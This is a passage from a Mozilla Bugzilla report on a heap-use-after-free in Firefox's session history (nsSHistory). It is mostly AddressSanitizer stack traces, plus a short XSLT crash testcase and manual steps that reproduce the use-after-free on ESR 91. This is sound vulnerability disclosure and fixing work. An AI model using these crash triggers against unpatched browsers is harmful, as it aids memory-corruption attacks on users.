    #2 0x7f40902b5aab in nsDocShell::GetBrowsingContext() /builds/worker/checkouts/gecko/docshell/base/nsDocShell.cpp:13633:60
    #3 0x7f408cb99367 in nsDocumentViewer::PermitUnload(nsIContentViewer::PermitUnloadAction, bool*) /builds/worker/checkouts/gecko/layout/base/nsDocumentViewer.cpp:1203:44
    #4 0x7f4090247d8b in PermitUnload /builds/worker/workspace/obj-build/dist/include/nsIContentViewer.h:91:14
    #5 0x7f4090247d8b in nsDocShell::InternalLoad(nsDocShellLoadState*, mozilla::Maybe<unsigned int>) /builds/worker/checkouts/gecko/docshell/base/nsDocShell.cpp:9489:26
    #6 0x7f40902a6b29 in nsDocShell::LoadURI(nsDocShellLoadState*, bool, bool) /builds/worker/checkouts/gecko/docshell/base/nsDocShell.cpp:882:8
    #7 0x7f409024438b in mozilla::dom::BrowsingContext::LoadURI(nsDocShellLoadState*, bool) /builds/worker/checkouts/gecko/docshell/base/BrowsingContext.cpp:1979:23
    #8 0x7f408b827b1b in mozilla::dom::ContentChild::RecvLoadURI(mozilla::dom::MaybeDiscarded<mozilla::dom::BrowsingContext> const&, nsDocShellLoadState*, bool, std::function<void (bool const&)>&&) /builds/worker/checkouts/gecko/dom/ipc/ContentChild.cpp:4374:12
    #9 0x7f408ba52208 in mozilla::dom::PContentChild::OnMessageReceived(IPC::Message const&) /builds/worker/workspace/obj-build/ipc/ipdl/PContentChild.cpp:13393:56
    #10 0x7f4085fa7c1d in mozilla::ipc::MessageChannel::DispatchAsyncMessage(mozilla::ipc::ActorLifecycleProxy*, IPC::Message const&) /builds/worker/checkouts/gecko/ipc/glue/MessageChannel.cpp:1707:25
    #11 0x7f4085fa5f86 in mozilla::ipc::MessageChannel::DispatchMessage(mozilla::ipc::ActorLifecycleProxy*, IPC::Message&&) /builds/worker/checkouts/gecko/ipc/glue/MessageChannel.cpp:1632:9
    #12 0x7f4085fa6fc4 in mozilla::ipc::MessageChannel::MessageTask::Run() /builds/worker/checkouts/gecko/ipc/glue/MessageChannel.cpp:1528:14
    #13 0x7f4084a53d42 in mozilla::RunnableTask::Run() /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:467:16
    #14 0x7f4084a1ab35 in mozilla::TaskController::DoExecuteNextTaskOnlyMainThreadInternal(mozilla::detail::BaseAutoLock<mozilla::Mutex&> const&) /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:780:26
    #15 0x7f4084a17ce8 in mozilla::TaskController::ExecuteNextTaskOnlyMainThreadInternal(mozilla::detail::BaseAutoLock<mozilla::Mutex&> const&) /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:612:15
    #16 0x7f4084a18410 in mozilla::TaskController::ProcessPendingMTTask(bool) /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:390:36
    #17 0x7f4084a60404 in operator() /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:127:37
    #18 0x7f4084a60404 in mozilla::detail::RunnableFunction<mozilla::TaskController::InitializeInternal()::$_1>::Run() /builds/worker/workspace/obj-build/dist/include/nsThreadUtils.h:531:5
    #19 0x7f4084a3ab57 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/checkouts/gecko/xpcom/threads/nsThread.cpp:1180:16
    #20 0x7f4084a4486c in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/checkouts/gecko/xpcom/threads/nsThreadUtils.cpp:465:10
    #21 0x7f4085fadb9d in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/checkouts/gecko/ipc/glue/MessagePump.cpp:107:5
    #22 0x7f4085e48931 in RunInternal /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:380:10
    #23 0x7f4085e48931 in RunHandler /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:373:3
    #24 0x7f4085e48931 in MessageLoop::Run() /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:355:3
    #25 0x7f408c4f68c7 in nsBaseAppShell::Run() /builds/worker/checkouts/gecko/widget/nsBaseAppShell.cpp:137:27
    #26 0x7f40910ca10f in XRE_RunAppShell() /builds/worker/checkouts/gecko/toolkit/xre/nsEmbedFunctions.cpp:870:20
    #27 0x7f4085e48931 in RunInternal /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:380:10
    #28 0x7f4085e48931 in RunHandler /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:373:3
    #29 0x7f4085e48931 in MessageLoop::Run() /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:355:3
    #30 0x7f40910c92f0 in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/checkouts/gecko/toolkit/xre/nsEmbedFunctions.cpp:729:34
    #31 0x55da630b879d in content_process_main(mozilla::Bootstrap*, int, char**) /builds/worker/checkouts/gecko/browser/app/../../ipc/contentproc/plugin-container.cpp:57:28
    #32 0x55da630b8bc1 in main /builds/worker/checkouts/gecko/browser/app/nsBrowserApp.cpp:327:18
    #33 0x7f40a477f30f in __libc_start_call_main libc-start.c
    #34 0x7f40a477f3c0 in __libc_start_main@GLIBC_2.2.5 (/usr/lib/libc.so.6+0x2d3c0) (BuildId: 85766e9d8458b16e9c7ce6e07c712c02b8471dbc)
    #35 0x55da62ff8c00 in _start (/m-c-20220425094217-asan-opt/firefox+0x59c00) (BuildId: bf94378dd81ac9813ccef59e5751219e1cb0391d)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /builds/worker/workspace/obj-build/dist/include/mozilla/RefPtr.h:286:27 in get
==2191266==ABORTING

```
Flags: needinfo?(armin)

|  | [Armin Ebert [:arminius]](/user_profile?user_id=526160)  Reporter |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1765951#c5)• 3 years ago |
| obsolete | |

| Comment hidden (obsolete) |  |
| --- | --- |

BTW, I came across [bug 1763617](/show_bug.cgi?id=1763617 "RESOLVED FIXED - Crash in [@ nsDocShell::FirePageHideShowNonRecursive]"), (a crash when `nsPIDOMWindowInner::GetPerformance()` returned null). Curiously, one way to provoke that crash would have been an XSLT error.

Testcase:

```
<?xml-stylesheet type="application/xml" href="data:,%3Cbad"?>
<foo/>

```

Since the linked XSLT sheet is invalid, the parser loads an XML error page here, after which `window.performance` is null.

If you now go back and forward in the history (before [bug 1763617](/show_bug.cgi?id=1763617 "RESOLVED FIXED - Crash in [@ nsDocShell::FirePageHideShowNonRecursive]") was patched), the crash occurs:

```
==2214069==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x7fc8e6cdf418 bp 0x7ffc40b5f4d0 sp 0x7ffc40b5f470 T0)
==2214069==The signal is caused by a READ memory access.
==2214069==Hint: address points to the zero page.
    #0 0x7fc8e6cdf418 in nsDocShell::FirePageHideShowNonRecursive(bool) /builds/worker/checkouts/gecko/docshell/base/nsDocShell.cpp:1328:36
    #1 0x7fc8e6dc7588 in operator() /builds/worker/checkouts/gecko/docshell/base/BrowsingContext.cpp:2946:34
    #2 0x7fc8e6dc7588 in std::_Function_handler<void (mozilla::dom::BrowsingContext*), mozilla::dom::BrowsingContext::DidSet(std::integral_constant<unsigned long, 59ul>)::$_22>::_M_invoke(std::_Any_data const&, mozilla::dom::BrowsingContext*&&) /builds/worker/fetches/sysroot-x86_64-linux-gnu/usr/lib/gcc/x86_64-linux-gnu/7.5.0/../../../../include/c++/7.5.0/bits/std_function.h:316:2
    #3 0x7fc8e6c6eb8c in operator() /builds/worker/fetches/sysroot-x86_64-linux-gnu/usr/lib/gcc/x86_64-linux-gnu/7.5.0/../../../../include/c++/7.5.0/bits/std_function.h:706:14
    #4 0x7fc8e6c6eb8c in mozilla::dom::BrowsingContext::PostOrderWalk(std::function<void (mozilla::dom::BrowsingContext*)> const&) /builds/worker/checkouts/gecko/docshell/base/BrowsingContext.cpp:1125:3
    #5 0x7fc8e6c84c77 in mozilla::dom::BrowsingContext::DidSet(std::integral_constant<unsigned long, 59ul>) /builds/worker/checkouts/gecko/docshell/base/BrowsingContext.cpp:2943:5
    #6 0x7fc8e6db653a in auto mozilla::dom::syncedcontext::Transaction<mozilla::dom::BrowsingContext>::Apply(mozilla::dom::BrowsingContext*, bool)::'lambda'(auto)::operator()<std::integral_constant<unsigned long, 59ul> >(auto) const /builds/worker/workspace/obj-build/dist/include/mozilla/dom/SyncedContextInlines.h:222:15
    #7 0x7fc8e6daae35 in void mozilla::dom::syncedcontext::FieldValues<mozilla::dom::BrowsingContext::BaseFieldValues, 65ul>::EachIndexInner<mozilla::dom::syncedcontext::Transaction<mozilla::dom::BrowsingContext>::Apply(mozilla::dom::BrowsingContext*, bool)::'lambda'(auto)&, 0ul, 1ul, 2ul, 3ul, 4ul, 5ul, 6ul, 7ul, 8ul, 9ul, 10ul, 11ul, 12ul, 13ul, 14ul, 15ul, 16ul, 17ul, 18ul, 19ul, 20ul, 21ul, 22ul, 23ul, 24ul, 25ul, 26ul, 27ul, 28ul, 29ul, 30ul, 31ul, 32ul, 33ul, 34ul, 35ul, 36ul, 37ul, 38ul, 39ul, 40ul, 41ul, 42ul, 43ul, 44ul, 45ul, 46ul, 47ul, 48ul, 49ul, 50ul, 51ul, 52ul, 53ul, 54ul, 55ul, 56ul, 57ul, 58ul, 59ul, 60ul, 61ul, 62ul, 63ul, 64ul>(std::integer_sequence<unsigned long, 0ul, 1ul, 2ul, 3ul, 4ul, 5ul, 6ul, 7ul, 8ul, 9ul, 10ul, 11ul, 12ul, 13ul, 14ul, 15ul, 16ul, 17ul, 18ul, 19ul, 20ul, 21ul, 22ul, 23ul, 24ul, 25ul, 26ul, 27ul, 28ul, 29ul, 30ul, 31ul, 32ul, 33ul, 34ul, 35ul, 36ul, 37ul, 38ul, 39ul, 40ul, 41ul, 42ul, 43ul, 44ul, 45ul, 46ul, 47ul, 48ul, 49ul, 50ul, 51ul, 52ul, 53ul, 54ul, 55ul, 56ul, 57ul, 58ul, 59ul, 60ul, 61ul, 62ul, 63ul, 64ul>, auto&&) /builds/worker/workspace/obj-build/dist/include/mozilla/dom/SyncedContext.h:151:6
    #8 0x7fc8e6c5e546 in EachIndex<(lambda at /builds/worker/workspace/obj-build/dist/include/mozilla/dom/SyncedContextInlines.h:217:13) &> /builds/worker/workspace/obj-build/dist/include/mozilla/dom/SyncedContext.h:137:5
    #9 0x7fc8e6c5e546 in EachIndex<(lambda at /builds/worker/workspace/obj-build/dist/include/mozilla/dom/SyncedContextInlines.h:217:13)> /builds/worker/workspace/obj-build/dist/include/mozilla/dom/SyncedContext.h:111:5
    #10 0x7fc8e6c5e546 in mozilla::dom::syncedcontext::Transaction<mozilla::dom::BrowsingContext>::Apply(mozilla::dom::BrowsingContext*, bool) /builds/worker/workspace/obj-build/dist/include/mozilla/dom/SyncedContextInlines.h:217:3
    #11 0x7fc8e6c5f288 in mozilla::dom::syncedcontext::Transaction<mozilla::dom::BrowsingContext>::CommitFromIPC(mozilla::dom::MaybeDiscarded<mozilla::dom::BrowsingContext> const&, unsigned long, mozilla::dom::ContentChild*) /builds/worker/workspace/obj-build/dist/include/mozilla/dom/SyncedContextInlines.h:202:3
    #12 0x7fc8e2a80558 in mozilla::dom::PContentChild::OnMessageReceived(IPC::Message const&) /builds/worker/workspace/obj-build/ipc/ipdl/PContentChild.cpp:15409:56
    #13 0x7fc8dd364ded in mozilla::ipc::MessageChannel::DispatchAsyncMessage(mozilla::ipc::ActorLifecycleProxy*, IPC::Message const&) /builds/worker/checkouts/gecko/ipc/glue/MessageChannel.cpp:1707:25
    #14 0x7fc8dd363196 in mozilla::ipc::MessageChannel::DispatchMessage(mozilla::ipc::ActorLifecycleProxy*, IPC::Message&&) /builds/worker/checkouts/gecko/ipc/glue/MessageChannel.cpp:1632:9
    #15 0x7fc8dd36419c in mozilla::ipc::MessageChannel::MessageTask::Run() /builds/worker/checkouts/gecko/ipc/glue/MessageChannel.cpp:1528:14
    #16 0x7fc8dc06f3b2 in mozilla::RunnableTask::Run() /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:467:16
    #17 0x7fc8dc0371fd in mozilla::TaskController::DoExecuteNextTaskOnlyMainThreadInternal(mozilla::detail::BaseAutoLock<mozilla::Mutex&> const&) /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:780:26
    #18 0x7fc8dc034a58 in mozilla::TaskController::ExecuteNextTaskOnlyMainThreadInternal(mozilla::detail::BaseAutoLock<mozilla::Mutex&> const&) /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:612:15
    #19 0x7fc8dc035189 in mozilla::TaskController::ProcessPendingMTTask(bool) /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:390:36
    #20 0x7fc8dc07c0b4 in operator() /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:127:37
    #21 0x7fc8dc07c0b4 in mozilla::detail::RunnableFunction<mozilla::TaskController::InitializeInternal()::$_1>::Run() /builds/worker/workspace/obj-build/dist/include/nsThreadUtils.h:531:5
    #22 0x7fc8dc056bd7 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/checkouts/gecko/xpcom/threads/nsThread.cpp:1180:16
    #23 0x7fc8dc06087c in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/checkouts/gecko/xpcom/threads/nsThreadUtils.cpp:465:10
    #24 0x7fc8dd36ac4d in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/checkouts/gecko/ipc/glue/MessagePump.cpp:107:5
    #25 0x7fc8dd273dd1 in RunInternal /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:380:10
    #26 0x7fc8dd273dd1 in RunHandler /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:373:3
    #27 0x7fc8dd273dd1 in MessageLoop::Run() /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:355:3
    #28 0x7fc8e34687b7 in nsBaseAppShell::Run() /builds/worker/checkouts/gecko/widget/nsBaseAppShell.cpp:137:27
    #29 0x7fc8e791e00f in XRE_RunAppShell() /builds/worker/checkouts/gecko/toolkit/xre/nsEmbedFunctions.cpp:870:20
    #30 0x7fc8dd273dd1 in RunInternal /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:380:10
    #31 0x7fc8dd273dd1 in RunHandler /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:373:3
    #32 0x7fc8dd273dd1 in MessageLoop::Run() /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:355:3
    #33 0x7fc8e791da18 in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/checkouts/gecko/toolkit/xre/nsEmbedFunctions.cpp:729:34
    #34 0x564d0554079d in content_process_main(mozilla::Bootstrap*, int, char**) /builds/worker/checkouts/gecko/browser/app/../../ipc/contentproc/plugin-container.cpp:57:28
    #35 0x564d05540bc1 in main /builds/worker/checkouts/gecko/browser/app/nsBrowserApp.cpp:327:18
    #36 0x7fc8f9d8d30f in __libc_start_call_main libc-start.c
    #37 0x7fc8f9d8d3c0 in __libc_start_main@GLIBC_2.2.5 (/usr/lib/libc.so.6+0x2d3c0)
    #38 0x564d0548f8ac in _start (/m-c-20220415034931-asan-opt/firefox+0x588ac)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /builds/worker/checkouts/gecko/docshell/base/nsDocShell.cpp:1328:36 in nsDocShell::FirePageHideShowNonRecursive(bool)
==2214069==ABORTING

```

Or, on ESR 91:

```
==2208951==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x7f4397ae3902 bp 0x7fff032f4970 sp 0x7fff032f4360 T0)
==2208951==The signal is caused by a READ memory access.
==2208951==Hint: address points to the zero page.
    #0 0x7f4397ae3902 in nsDocShell::RestoreFromHistory() /builds/worker/checkouts/gecko/docshell/base/nsDocShell.cpp:7551:35
    #1 0x7f4397ae1264 in nsDocShell::RestorePresentationEvent::Run() /builds/worker/checkouts/gecko/docshell/base/nsDocShell.cpp:6951:20
    #2 0x7f438dee2a7f in mozilla::SchedulerGroup::Runnable::Run() /builds/worker/checkouts/gecko/xpcom/threads/SchedulerGroup.cpp:144:20
    #3 0x7f438df2072a in mozilla::RunnableTask::Run() /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:502:16
    #4 0x7f438def0c4b in mozilla::TaskController::DoExecuteNextTaskOnlyMainThreadInternal(mozilla::detail::BaseAutoLock<mozilla::Mutex&> const&) /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:805:26
    #5 0x7f438deee8f8 in mozilla::TaskController::ExecuteNextTaskOnlyMainThreadInternal(mozilla::detail::BaseAutoLock<mozilla::Mutex&> const&) /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:641:15
    #6 0x7f438deef00d in mozilla::TaskController::ProcessPendingMTTask(bool) /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:425:36
    #7 0x7f438df288b1 in operator() /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:135:37
    #8 0x7f438df288b1 in mozilla::detail::RunnableFunction<mozilla::TaskController::InitializeInternal()::$_0>::Run() /builds/worker/checkouts/gecko/xpcom/threads/nsThreadUtils.h:532:5
    #9 0x7f438df09e9f in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/checkouts/gecko/xpcom/threads/nsThread.cpp:1152:16
    #10 0x7f438df1416c in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/checkouts/gecko/xpcom/threads/nsThreadUtils.cpp:466:10
    #11 0x7f438efbebea in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/checkouts/gecko/ipc/glue/MessagePump.cpp:85:21
    #12 0x7f438eed4241 in RunInternal /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:331:10
    #13 0x7f438eed4241 in RunHandler /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:324:3
    #14 0x7f438eed4241 in MessageLoop::Run() /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:306:3
    #15 0x7f4394d35447 in nsBaseAppShell::Run() /builds/worker/checkouts/gecko/widget/nsBaseAppShell.cpp:137:27
    #16 0x7f439857bc8f in XRE_RunAppShell() /builds/worker/checkouts/gecko/toolkit/xre/nsEmbedFunctions.cpp:923:20
    #17 0x7f438eed4241 in RunInternal /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:331:10
    #18 0x7f438eed4241 in RunHandler /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:324:3
    #19 0x7f438eed4241 in MessageLoop::Run() /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:306:3
    #20 0x7f439857b625 in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/checkouts/gecko/toolkit/xre/nsEmbedFunctions.cpp:755:34
    #21 0x55bc65e2839d in content_process_main(mozilla::Bootstrap*, int, char**) /builds/worker/checkouts/gecko/browser/app/../../ipc/contentproc/plugin-container.cpp:57:28
    #22 0x55bc65e287c1 in main /builds/worker/checkouts/gecko/browser/app/nsBrowserApp.cpp:327:18
    #23 0x7f43abfbc30f in __libc_start_call_main libc-start.c
    #24 0x7f43abfbc3c0 in __libc_start_main@GLIBC_2.2.5 (/usr/lib/libc.so.6+0x2d3c0)
    #25 0x55bc65d796bc in _start (/m-e-20220418134430-asan-opt/firefox+0x566bc)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /builds/worker/checkouts/gecko/docshell/base/nsDocShell.cpp:7551:35 in nsDocShell::RestoreFromHistory()
==2208951==ABORTING

```

|  | [Olli Pettay [:smaug][bugs@pettay.fi]](/user_profile?user_id=39966) |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1765951#c6)• 3 years ago |
|  | |

a testcase triggering the crash mentioned in [comment 0](/show_bug.cgi?id=1765951#c0 "VERIFIED FIXED - heap-use-after-free in nsSHistory") would be still very nice. The testcases in [comment 4](/show_bug.cgi?id=1765951#c4 "VERIFIED FIXED - heap-use-after-free in nsSHistory") and [comment 5](/show_bug.cgi?id=1765951#c5 "VERIFIED FIXED - heap-use-after-free in nsSHistory") are showing mostly different issues.

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1765951#a985670_24295)• 3 years ago |

Assignee: nobody → petervStatus: UNCONFIRMED → ASSIGNEDEver confirmed: true

|  | [Peter Van der Beken [:peterv]](/user_profile?user_id=24295)  Assignee |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1765951#c7)• 3 years ago |
|  | |

Attached file
[Bug 1765951 - Stop storing BC pointer in nsSHistory. r?smaug!](attachment.cgi?id=9276277)
— [Details](attachment.cgi?id=9276277&action=edit)

|  | [Armin Ebert [:arminius]](/user_profile?user_id=526160)  Reporter |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1765951#c8)• 3 years ago |
|  | |

(In reply to Olli Pettay [:smaug] from [comment #6](/show_bug.cgi?id=1765951#c6 "VERIFIED FIXED - heap-use-after-free in nsSHistory"))

> a testcase triggering the crash mentioned in [comment 0](/show_bug.cgi?id=1765951#c0 "VERIFIED FIXED - heap-use-after-free in nsSHistory") would be still very nice. The testcases in [comment 4](/show_bug.cgi?id=1765951#c4 "VERIFIED FIXED - heap-use-after-free in nsSHistory") and [comment 5](/show_bug.cgi?id=1765951#c5 "VERIFIED FIXED - heap-use-after-free in nsSHistory") are showing mostly different issues.

These steps reproduce the UAF for me on ESR 91.10.0 (`m-e-20220509165252-asan-opt`):

1. Go to `http://example.com/`.
2. Go to `http://example.com/foo`.
3. Go to `about:tabcrashed`.
4. Go back two history entries at once (e.g. right-click the back arrow and choose the second-last entry).
5. Go forward two entries.
6. GC (e.g. via `about:memory` in a separate tab).
7. Press the reload or back button (possibly try a few times).
8. A crash similar to the one below occurs.

```
==78268==ERROR: AddressSanitizer: heap-use-after-free on address 0x61a000176a80 at pc 0x7fc8c7911fb6 bp 0x7ffce1c2e610 sp 0x7ffce1c2e608
READ of size 8 at 0x61a000176a80 thread T0
    #0 0x7fc8c7911fb5 in AddRef /builds/worker/workspace/obj-build/dist/include/mozilla/RefPtr.h:49:39
    #1 0x7fc8c7911fb5 in AddRef /builds/worker/workspace/obj-build/dist/include/mozilla/RefPtr.h:380:35
    #2 0x7fc8c7911fb5 in assign_with_AddRef /builds/worker/workspace/obj-build/dist/include/mozilla/RefPtr.h:60:7
    #3 0x7fc8c7911fb5 in operator= /builds/worker/workspace/obj-build/dist/include/mozilla/RefPtr.h:190:5
    #4 0x7fc8c7911fb5 in nsSHistory::InitiateLoad(nsISHEntry*, mozilla::dom::BrowsingContext*, long, nsTArray<nsSHistory::LoadEntryResult>&, bool) /builds/worker/checkouts/gecko/docshell/shistory/nsSHistory.cpp:2149:32
    #5 0x7fc8c790bdfd in nsSHistory::LoadEntry(int, long, unsigned int, nsTArray<nsSHistory::LoadEntryResult>&, bool, bool) /builds/worker/checkouts/gecko/docshell/shistory/nsSHistory.cpp:2046:5
    #6 0x7fc8c790b2c2 in nsSHistory::Reload(unsigned int, nsTArray<nsSHistory::LoadEntryResult>&) /builds/worker/checkouts/gecko/docshell/shistory/nsSHistory.cpp:1364:17
    #7 0x7fc8c790ac66 in nsSHistory::Reload(unsigned int) /builds/worker/checkouts/gecko/docshell/shistory/nsSHistory.cpp:1325:17
    #8 0x7fc8c78df815 in mozilla::dom::ChildSHistory::Reload(unsigned int, mozilla::ErrorResult&) /builds/worker/checkouts/gecko/docshell/shistory/ChildSHistory.cpp:124:19
    #9 0x7fc8c179bf9b in mozilla::dom::ChildSHistory_Binding::reload(JSContext*, JS::Handle<JSObject*>, void*, JSJitMethodCallArgs const&) /builds/worker/workspace/obj-build/dom/bindings/ChildSHistoryBinding.cpp:218:24
    #10 0x7fc8c2474279 in bool mozilla::dom::binding_detail::GenericMethod<mozilla::dom::binding_detail::NormalThisPolicy, mozilla::dom::binding_detail::ThrowExceptions>(JSContext*, unsigned int, JS::Value*) /builds/worker/checkouts/gecko/dom/bindings/BindingUtils.cpp:3297:13
    #11 0x7fc8c84fb131 in CallJSNative /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:426:13
    #12 0x7fc8c84fb131 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct, js::CallReason) /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:511:12
    #13 0x7fc8c84e2dae in CallFromStack /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:575:10
    #14 0x7fc8c84e2dae in Interpret(JSContext*, js::RunState&) /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:3226:16
    #15 0x7fc8c84cc967 in js::RunScript(JSContext*, js::RunState&) /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:395:13
    #16 0x7fc8c84fb215 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct, js::CallReason) /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:543:13
    #17 0x7fc8c84fcd2b in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>, js::CallReason) /builds/worker/checkouts/gecko/js/src/vm/Interpreter.cpp:588:8
    #18 0x7fc8c8631a3b in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/checkouts/gecko/js/src/jsapi.cpp:2785:10
    #19 0x7fc8c11117c4 in mozilla::dom::MessageListener::ReceiveMessage(mozilla::dom::BindingCallContext&, JS::Handle<JS::Value>, mozilla::dom::ReceiveMessageArgument const&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /builds/worker/workspace/obj-build/dom/bindings/MessageManagerBinding.cpp:6097:8
    #20 0x7fc8c435e1f8 in mozilla::dom::MessageListener::ReceiveMessage(mozilla::dom::ReceiveMessageArgument const&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&, char const*, mozilla::dom::CallbackObject::ExceptionHandling, JS::Realm*) /builds/worker/workspace/obj-build/dist/include/mozilla/dom/MessageManagerBinding.h:783:12
    #21 0x7fc8c435ddb8 in mozilla::dom::JSActor::CallReceiveMessage(JSContext*, mozilla::dom::JSActorMessageMeta const&, JS::Handle<JS::Value>, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /builds/worker/checkouts/gecko/dom/ipc/jsactor/JSActor.cpp:271:22
    #22 0x7fc8c435e47f in mozilla::dom::JSActor::ReceiveMessage(JSContext*, mozilla::dom::JSActorMessageMeta const&, JS::Handle<JS::Value>, mozilla::ErrorResult&) /builds/worker/checkouts/gecko/dom/ipc/jsactor/JSActor.cpp:284:3
    #23 0x7fc8c4364409 in mozilla::dom::JSActorManager::ReceiveRawMessage(mozilla::dom::JSActorMessageMeta const&, mozilla::Maybe<mozilla::dom::ipc::StructuredCloneData>&&, mozilla::Maybe<mozilla::dom::ipc::StructuredCloneData>&&) /builds/worker/checkouts/gecko/dom/ipc/jsactor/JSActorManager.cpp:192:14
    #24 0x7fc8c437a440 in operator() /builds/worker/checkouts/gecko/dom/ipc/jsactor/JSActor.cpp:358:22
    #25 0x7fc8c437a440 in mozilla::detail::RunnableFunction<mozilla::dom::JSActor::SendRawMessageInProcess(mozilla::dom::JSActorMessageMeta const&, mozilla::Maybe<mozilla::dom::ipc::StructuredCloneData>&&, mozilla::Maybe<mozilla::dom::ipc::StructuredCloneData>&&, std::function<already_AddRefed<mozilla::dom::JSActorManager> ()>&&)::$_0>::Run() /builds/worker/workspace/obj-build/dist/include/nsThreadUtils.h:532:5
    #26 0x7fc8bdc5872a in mozilla::RunnableTask::Run() /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:502:16
    #27 0x7fc8bdc28c4b in mozilla::TaskController::DoExecuteNextTaskOnlyMainThreadInternal(mozilla::detail::BaseAutoLock<mozilla::Mutex&> const&) /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:805:26
    #28 0x7fc8bdc268f8 in mozilla::TaskController::ExecuteNextTaskOnlyMainThreadInternal(mozilla::detail::BaseAutoLock<mozilla::Mutex&> const&) /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:641:15
    #29 0x7fc8bdc2700d in mozilla::TaskController::ProcessPendingMTTask(bool) /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:425:36
    #30 0x7fc8bdc608e4 in operator() /builds/worker/checkouts/gecko/xpcom/threads/TaskController.cpp:138:37
    #31 0x7fc8bdc608e4 in mozilla::detail::RunnableFunction<mozilla::TaskController::InitializeInternal()::$_1>::Run() /builds/worker/checkouts/gecko/xpcom/threads/nsThreadUtils.h:532:5
    #32 0x7fc8bdc41e9f in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/checkouts/gecko/xpcom/threads/nsThread.cpp:1152:16
    #33 0x7fc8bdc4c16c in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/checkouts/gecko/xpcom/threads/nsThreadUtils.cpp:466:10
    #34 0x7fc8becf6bdf in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/checkouts/gecko/ipc/glue/MessagePump.cpp:107:5
    #35 0x7fc8bec0c241 in RunInternal /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:331:10
    #36 0x7fc8bec0c241 in RunHandler /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:324:3
    #37 0x7fc8bec0c241 in MessageLoop::Run() /builds/worker/checkouts/gecko/ipc/chromium/src/base/message_loop.cc:306:3
